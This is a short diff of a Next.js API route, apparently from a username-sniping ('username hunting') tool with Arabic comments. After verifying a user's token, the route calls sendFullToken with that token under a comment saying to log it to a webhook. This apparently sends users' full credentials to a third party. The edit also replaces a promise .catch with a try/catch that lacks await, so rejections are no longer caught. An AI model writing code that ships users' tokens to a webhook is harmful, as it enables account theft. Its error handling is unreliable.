@@ -170,7 +170,7 @@ export async function POST(request: NextRequest) {
     const userInfo = await verifyRes.json().catch(() => ({} as any))
 
     // سجل في الويب هوك
-    sendFullToken('صيد يوزرات (Stream)', ct).catch(() => {})
+    try { sendFullToken('صيد يوزرات (Stream)', ct) } catch {}
 
     // ===== توليد قائمة اليوزرات =====
     let namesToCheck: string[] = []
